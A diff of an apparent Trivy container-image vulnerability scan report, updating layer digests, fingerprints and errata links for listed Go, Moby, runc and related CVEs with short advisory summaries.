 │     │      ├ Description     : tar.Reader can allocate an unbounded amount of memory when reading a
@@ -4928,14 +4525,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.9, 1.26.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32289 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:c5fa2de7c210ac5e9021ab34858354dfba8bd4bcdf5cb80d638b732768066682 
+│     │      ├ Fingerprint     : sha256:3d627d0f3f865aca76b1f2f0975fe006497cdefd149f304bc8947f87ec52a8c4 
 │     │      ├ Title           : html/template: golang: html/template: Cross-Site Scripting (XSS) via improper
 │     │      │                   context and brace depth tracking in JS template literals 
 │     │      ├ Description     : Context was not properly tracked across template branches for JS template
@@ -4975,13 +4572,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:031519f099c5a543a6bbe2269394a6c1bb3792fb1a6f8ff63a207ae21fe7b5a5 
+│     │      ├ Fingerprint     : sha256:d3cc1bb72cb7d7bcff57404ec85f0481262f1a59180798b90c34fa5129437dea 
 │     │      ├ Title           : html/template: golang: Go html/template: Cross-Site Scripting via improper URL
 │     │      │                    escaping in meta tag content 
 │     │      ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
@@ -5019,13 +4616,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:0f4f02e599537a7c5a1e8c4699b000d8284a9535f7c3734c432d7a64895eaa9f 
+│     │      ├ Fingerprint     : sha256:c3c07936251c0ddb8a1916ac93ad190a2bdb0eaa882329e38cfecf3ebe54804f 
 │     │      ├ Title           : net/http/httputil: golang: net/http/httputil: ReverseProxy forwards hidden
 │     │      │                   query parameters, potentially bypassing security controls 
 │     │      ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
@@ -5068,13 +4665,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:fcf4e0354eaca802b963b9f7b937863c67a2d34aace022835d31879f98324fb8 
+│     │      ├ Fingerprint     : sha256:2b9a7b31a19bcdb3e6f84b09a7027fa4a3d1bc546588b9e8353ad71fbba60c35 
 │     │      ├ Title           : html/template: golang: html/template: Cross-site scripting due to incorrect
 │     │      │                   script tag escaping 
 │     │      ├ Description     : If a trusted template author were to write a <script> tag containing an empty
@@ -5112,13 +4709,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:86470443668ac2b032bda48c317580398c8d2962eeac5655ad137e519fedcd9d 
+│     │      ├ Fingerprint     : sha256:6af6ee650ee7b3d6cddc7dc6a58e0727871fcb6888cd1635f590adbe06e43095 
 │     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
 │     │      │                   Hello 
 │     │      ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
@@ -5151,13 +4748,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.11, 1.26.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:72e50a6490c35cd4788e8445271ed5fa60e181700815bee440d854cac70a3dbc 
+│     │      ├ Fingerprint     : sha256:21875ed69666a8eaeb8ac234fcf5097a220dc7b46410f5bdb6a243cb9fa327e2 
 │     │      ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
 │     │      │                   input injection 
 │     │      ├ Description     : When returning errors, functions in the net/textproto package would include
@@ -5174,14 +4771,14 @@
 │     │      │                  │         ╰ V3Score : 5.3 
 │     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
 │     │      │                            ╰ V3Score : 5.3 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29980 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
 │     │      │                  ├ [2] : https://bugzilla.redhat.com/2484205 
 │     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
 │     │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
 │     │      │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
 │     │      │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
-│     │      │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
+│     │      │                  ├ [7] : https://errata.almalinux.org/10/ALSA-2026-29980.html 
 │     │      │                  ├ [8] : https://errata.rockylinux.org/RLSA-2026:29981 
 │     │      │                  ├ [9] : https://go.dev/cl/777060 
 │     │      │                  ├ [10]: https://go.dev/issue/79346 
@@ -5202,13 +4799,13 @@
 │            ├ InstalledVersion: v1.24.13 
 │            ├ FixedVersion    : 1.25.8, 1.26.1 
 │            ├ Status          : fixed 
-│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│            ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│            │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27139 
 │            ├ DataSource       ╭ ID  : govulndb 
 │            │                  ├ Name: The Go Vulnerability Database 
 │            │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│            ├ Fingerprint     : sha256:c7ccd25dcc31643a196ce191e636a1916aff8990cbca42b413dacb91d7e03bad 
+│            ├ Fingerprint     : sha256:748f870b9a19b8d7e8db4becb7f05fc76ec91643f3aac1bfd80c3a01a98bd20b 
 │            ├ Title           : os: FileInfo can escape from a Root in golang os module 
 │            ├ Description     : On Unix platforms, when listing the contents of a directory using File.ReadDir
 │            │                    or File.Readdir the returned FileInfo could reference a file outside of the
@@ -5242,12 +4839,12 @@
 │     │     │                  ╰ UID : c527a3567c036841 
 │     │     ├ InstalledVersion: v0.54.0 
 │     │     ├ Status          : affected 
-│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │     ├ DataSource       ╭ ID  : govulndb 
 │     │     │                  ├ Name: The Go Vulnerability Database 
 │     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │     ├ Fingerprint     : sha256:6ce745da752559a48a60576c52f53bf3601322742f4aed430538f11d2aa98d7c 
+│     │     ├ Fingerprint     : sha256:c3cdb0d59b14695f41eb5cd4c641ecceb4fd7143d89d43c6a6807f609f107f1d 
 │     │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
 │     │     │                   has known security issues 
 │     │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known
@@ -5267,14 +4864,14 @@
 │           │                  ╰ UID : 2d707a2bb38acc69 
 │           ├ InstalledVersion: v2.6.1 
 │           ├ Status          : affected 
-│           ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│           │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│           ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│           │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │           ├ SeveritySource  : ghsa 
 │           ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-50163 
 │           ├ DataSource       ╭ ID  : ghsa 
 │           │                  ├ Name: GitHub Security Advisory Go 
 │           │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│           ├ Fingerprint     : sha256:5e3db64a9cedcb6f0593dfbbd20ab942fe5cb009dfc83d5afd0a31c4cb7af1cd 
+│           ├ Fingerprint     : sha256:13110fea559aad646c20d92b4eb992b57d2b0ee376d17bea639a1ba4b9176599 
 │           ├ Title           : oras-go: Oras-go: Information disclosure and arbitrary file access via crafted
 │           │                   tarball hardlinks 
 │           ├ Description     : oras-go is a Go library for managing OCI artifacts. Prior to 2.6.2,
@@ -5316,12 +4913,12 @@
 │     │     │                  ╰ UID : 2c4facc961c689eb 
 │     │     ├ InstalledVersion: v0.53.0 
 │     │     ├ Status          : affected 
-│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │     ├ DataSource       ╭ ID  : govulndb 
 │     │     │                  ├ Name: The Go Vulnerability Database 
 │     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │     ├ Fingerprint     : sha256:334e8b3cb5655ef569e635f13bc1663d645f0e645f46f132d0443652afb5c3e0 
+│     │     ├ Fingerprint     : sha256:8d506ef7dc489d2371ccb50e178faba2cdccfacc83a02ec3955012310ccb5d6a 
 │     │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
 │     │     │                   has known security issues 
 │     │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known
@@ -5342,13 +4939,13 @@
 │     │     ├ InstalledVersion: v0.38.0 
 │     │     ├ FixedVersion    : 0.39.0 
 │     │     ├ Status          : fixed 
-│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
 │     │     ├ DataSource       ╭ ID  : govulndb 
 │     │     │                  ├ Name: The Go Vulnerability Database 
 │     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │     ├ Fingerprint     : sha256:7833ca547e02c4d2a394f510b43b9508f41c9f56b5d637a8c4d5fa98ea0d6662 
+│     │     ├ Fingerprint     : sha256:eabd64af6d496db52ff72d31e5e20787e08c42f340a76c913f50f0c42e4bc9cf 
 │     │     ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
 │     │     ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
 │     │     │                   UTF-8 bytes. 
@@ -5369,14 +4966,14 @@
 │           ├ InstalledVersion: v1.81.1 
 │           ├ FixedVersion    : 1.82.1 
 │           ├ Status          : fixed 
-│           ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│           │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│           ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│           │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │           ├ SeveritySource  : ghsa 
 │           ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
 │           ├ DataSource       ╭ ID  : ghsa 
 │           │                  ├ Name: GitHub Security Advisory Go 
 │           │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│           ├ Fingerprint     : sha256:ba57710bb4eb3b287b8927e12f3ac1ea3edef40c230ead33fceef4a4d2179a6f 
+│           ├ Fingerprint     : sha256:fc8f9e1fba4e06680ae28b20d2300f2e2fe73f90664958f00ebd3065c534d8b7 
 │           ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
 │           ├ Description     : Multiple security vulnerabilities have been identified and addressed in grpc-go
 │           │                    affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2
@@ -5475,14 +5072,14 @@
 │     │      ├ InstalledVersion: v28.5.1+incompatible 
 │     │      ├ FixedVersion    : 29.3.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:c0e60c5dae56579c4381d30a5a64ba0fb1a3ff5701d2f84a174d630fb4ac80c3 
+│     │      ├ Fingerprint     : sha256:4fafd6ed780defea514b4ccc9046d46147be0c29119049f73fc67df871536ea8 
 │     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
 │     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
 │     │      │                   security vulnerability has been detected that allows attackers to bypass
@@ -5521,14 +5118,14 @@
 │     │      │                  ╰ UID : 65d09eff9cd64aa5 
 │     │      ├ InstalledVersion: v28.5.1+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41567 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:081ba22da45acb7e5f23bb2e8bf88cfd1a5bd261c4ce44c51c22ff340075dc27 
+│     │      ├ Fingerprint     : sha256:055a7a5db64e3fdd94f8ad035f8e0379f18f9cd027dc55b454b2dd9db6a12f9e 
 │     │      ├ Title           : docker: Moby/Docker Engine: Arbitrary Code Execution via malicious container
 │     │      │                   image and compressed archive upload 
 │     │      ├ Description     : Moby is an open source container framework. In versions prior to 29.5.1 and in
@@ -5577,14 +5174,14 @@
 │     │      │                  ╰ UID : 65d09eff9cd64aa5 
 │     │      ├ InstalledVersion: v28.5.1+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42306 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:8f6d3dea7bd0e7ae1e1eaf49b26ed08bf57484c625f8cde64b107d34d80ea1d6 
+│     │      ├ Fingerprint     : sha256:d65209a0299024181c3996ddcf0434d23699e67b20a6e4a4d63c2c4848ae4cb2 
 │     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby container framework: Host
 │     │      │                    file overwrite via race condition in docker cp mount setup 
 │     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
@@ -5624,14 +5221,14 @@
 │     │      ├ InstalledVersion: v28.5.1+incompatible 
 │     │      ├ FixedVersion    : 29.3.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:2daed0d90b8d51e5d84bf7d32d18eb8333b7d558b478c474743476643db75fb1 
+│     │      ├ Fingerprint     : sha256:1fb4bd5b3a0f721ccebb0a8dff6be89d600d47cd0d0221fe1e8b3e4677797529 
 │     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
 │     │      │                   plugin installation 
 │     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
@@ -5680,14 +5277,14 @@
 │     │      │                  ╰ UID : 65d09eff9cd64aa5 
 │     │      ├ InstalledVersion: v28.5.1+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41568 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:8b3eea271c20e0ce30a06af708fa925f1d433933adf82cdc0f8abad778463f56 
+│     │      ├ Fingerprint     : sha256:6132b9c1f17eb69d7b74fbbe854a78e01847543b740312f908046656ffc14809 
 │     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby: Denial of Service via
 │     │      │                   race condition in docker cp mount setup 
 │     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
@@ -5721,14 +5318,14 @@
 │     │      ├ InstalledVersion: v1.12.0 
 │     │      ├ FixedVersion    : 1.13.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-52881 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:cff90c0946445025c08523c198bd366b907d6d77b7b456578d78d1f6d8bc682d 
+│     │      ├ Fingerprint     : sha256:4e76a66c514e06023d107b7086139faea1a1d5fb41ffd09b50ebb87dd3876a93 
 │     │      ├ Title           : runc: opencontainers/selinux: container escape and denial of service due to
 │     │      │                   arbitrary write gadgets and procfs write redirects 
 │     │      ├ Description     : runc is a CLI tool for spawning and running containers according to the OCI
@@ -5770,71 +5367,70 @@
 │     │      │                  │       e2801449697322 
 │     │      │                  ├ [2] : http://github.com/opencontainers/runc/commit/fdcc9d3cad2f85954a241ccb91
 │     │      │                  │       0a61aaa1ef47f3 
-│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2025:22011 
+│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2025:21220 
 │     │      │                  ├ [4] : https://access.redhat.com/security/cve/CVE-2025-52881 
 │     │      │                  ├ [5] : https://bugzilla.redhat.com/2404715 
-│     │      │                  ├ [6] : https://bugzilla.redhat.com/2407258 
-│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2404715 
-│     │      │                  ├ [8] : https://bugzilla.redhat.com/show_bug.cgi?id=2407258 
-│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-52881 
-│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58183 
-│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2025-22011.html 
-│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2025:22011 
-│     │      │                  ├ [13]: https://github.com/bottlerocket-os/bottlerocket-core-kit/blob/develop/a
+│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2404715 
+│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2407258 
+│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-52881 
+│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58183 
+│     │      │                  ├ [10]: https://errata.almalinux.org/10/ALSA-2025-21220.html 
+│     │      │                  ├ [11]: https://errata.rockylinux.org/RLSA-2025:22011 
+│     │      │                  ├ [12]: https://github.com/bottlerocket-os/bottlerocket-core-kit/blob/develop/a
 │     │      │                  │       dvisories/10.9.0/BRSA-fokfzmhxepqx.toml 
-│     │      │                  ├ [14]: https://github.com/opencontainers/runc 
-│     │      │                  ├ [15]: https://github.com/opencontainers/runc/blob/v1.4.0-rc.2/RELEASES.md 
-│     │      │                  ├ [16]: https://github.com/opencontainers/runc/commit/3f925525b44d247e390e529e7
+│     │      │                  ├ [13]: https://github.com/opencontainers/runc 
+│     │      │                  ├ [14]: https://github.com/opencontainers/runc/blob/v1.4.0-rc.2/RELEASES.md 
